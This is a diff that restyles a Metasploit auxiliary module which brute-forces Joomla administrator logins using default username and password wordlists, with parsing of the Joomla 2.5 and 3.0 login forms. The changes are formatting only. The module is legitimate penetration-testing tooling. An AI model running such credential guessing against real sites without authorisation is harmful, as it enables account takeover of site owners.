@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -26,30 +27,31 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         OptPath.new('USERPASS_FILE', [false, 'File containing users and passwords separated by space, one pair per line',
-          File.join(Msf::Config.data_directory, 'wordlists', 'http_default_userpass.txt')]),
+                                      File.join(Msf::Config.data_directory, 'wordlists', 'http_default_userpass.txt')]),
         OptPath.new('USER_FILE', [false, 'File containing users, one per line',
-          File.join(Msf::Config.data_directory, 'wordlists', "http_default_users.txt")]),
+                                  File.join(Msf::Config.data_directory, 'wordlists', "http_default_users.txt")]),
         OptPath.new('PASS_FILE', [false, 'File containing passwords, one per line',
-          File.join(Msf::Config.data_directory, 'wordlists', 'http_default_pass.txt')]),
+                                  File.join(Msf::Config.data_directory, 'wordlists', 'http_default_pass.txt')]),
         OptString.new('AUTH_URI', [true, 'The URI to authenticate against', '/administrator/index.php']),
-        OptString.new('FORM_URI', [true, 'The FORM URI to authenticate against' , '/administrator']),
+        OptString.new('FORM_URI', [true, 'The FORM URI to authenticate against', '/administrator']),
         OptString.new('USER_VARIABLE', [true, 'The name of the variable for the user field', 'username']),
-        OptString.new('PASS_VARIABLE', [true, 'The name of the variable for the password field' , 'passwd']),
+        OptString.new('PASS_VARIABLE', [true, 'The name of the variable for the password field', 'passwd']),
         OptString.new('WORD_ERROR', [true, 'The word of message for detect that login fail', 'mod-login-username'])
-      ], self.class)
+      ], self.class
+    )
 
     register_autofilter_ports([80, 443])
   end
 
   def find_auth_uri
-    if datastore['AUTH_URI'] && datastore['AUTH_URI'].length > 0
-      paths = [datastore['AUTH_URI']]
-    else
-      paths = %w(
-        /
-        /administrator/
-      )
-    end
+    paths = if datastore['AUTH_URI'] && !datastore['AUTH_URI'].empty?
+              [datastore['AUTH_URI']]
+            else
+              %w(
+                /
+                /administrator/
+              )
+            end
 
     paths.each do |path|
       begin
@@ -85,13 +87,11 @@ class MetasploitModule < Msf::Auxiliary
 
   def target_url
     proto = 'http'
-    if rport == 443 || ssl
-      proto = 'https'
-    end
+    proto = 'https' if rport == 443 || ssl
     "#{proto}://#{rhost}:#{rport}#{@uri}"
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     vprint_status("#{rhost}:#{rport} - Searching Joomla authentication URI...")
     @uri = find_auth_uri
 
@@ -138,7 +138,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def do_login(user, pass)
     vprint_status("#{target_url} - Trying username:'#{user}' with password:'#{pass}'")
-    response  = do_web_login(user, pass)
+    response = do_web_login(user, pass)
     result = determine_result(response)
 
     if result == :success
@@ -200,22 +200,22 @@ class MetasploitModule < Msf::Auxiliary
         res = send_request_raw(
           'uri'     => path,
           'method'  => 'GET',
-          'cookie' => "#{cookie}"
+          'cookie' => cookie.to_s
         )
       end
     end
 
     return res
-    rescue ::Rex::ConnectionError
-      vprint_error("#{target_url} - Failed to connect to the web server")
-      return nil
+  rescue ::Rex::ConnectionError
+    vprint_error("#{target_url} - Failed to connect to the web server")
+    return nil
   end
 
   def send_request_login(opts = {})
     res = send_request_cgi(
       'uri'     => @uri,
       'method'  => 'POST',
-      'cookie'  => "#{opts['cookie']}",
+      'cookie'  => (opts['cookie']).to_s,
       'headers' =>
         {
           'Referer' => opts['referer_var']
@@ -235,7 +235,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def determine_result(response)
-    return :abort unless response.kind_of?(Rex::Proto::Http::Response)
+    return :abort unless response.is_a?(Rex::Proto::Http::Response)
     return :abort unless response.code
 
     if [200, 301, 302].include?(response.code)
@@ -257,20 +257,20 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def get_login_cookie(res)
-    return nil unless res.kind_of?(Rex::Proto::Http::Response)
+    return nil unless res.is_a?(Rex::Proto::Http::Response)
 
     res.get_cookies
   end
 
   def get_login_hidden(res)
-    return nil unless res.kind_of?(Rex::Proto::Http::Response)
+    return nil unless res.is_a?(Rex::Proto::Http::Response)
 
     return nil if res.body.blank?
 
     vprint_status("#{target_url} - Testing Joomla 2.5 Form...")
     form = res.body.split(/<form action=([^\>]+) method="post" id="form-login"\>(.*)<\/form>/mi)
 
-    if form.length == 1  # is not Joomla 2.5
+    if form.length == 1 # is not Joomla 2.5
       vprint_status("#{target_url} - Testing Form Joomla 3.0 Form...")
       form = res.body.split(/<form action=([^\>]+) method="post" id="form-login" class="form-inline"\>(.*)<\/form>/mi)
     end
@@ -291,5 +291,4 @@ class MetasploitModule < Msf::Auxiliary
 
     valor_input_id
   end
-
 end
